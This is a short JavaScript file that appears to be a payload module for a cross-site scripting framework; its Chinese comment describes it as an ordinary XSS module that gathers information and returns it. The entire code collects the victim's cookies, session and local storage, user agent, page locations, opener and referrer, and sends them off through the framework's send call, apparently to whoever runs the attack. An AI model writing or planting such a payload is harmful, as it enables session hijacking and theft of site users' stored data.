/*
  普通xss模块，获取一些信息并返回
 */
co.api.send({
    ua: co.information.userAgent(),
    cookie: co.information.cookie(),
    ss: co.information.sessionStorage(),
    ls: co.information.localStorage(),
    wl: co.information.location(),
    wtl: co.information.topLocation(),
    opener: co.information.opener(),
    referer: co.information.referer()
})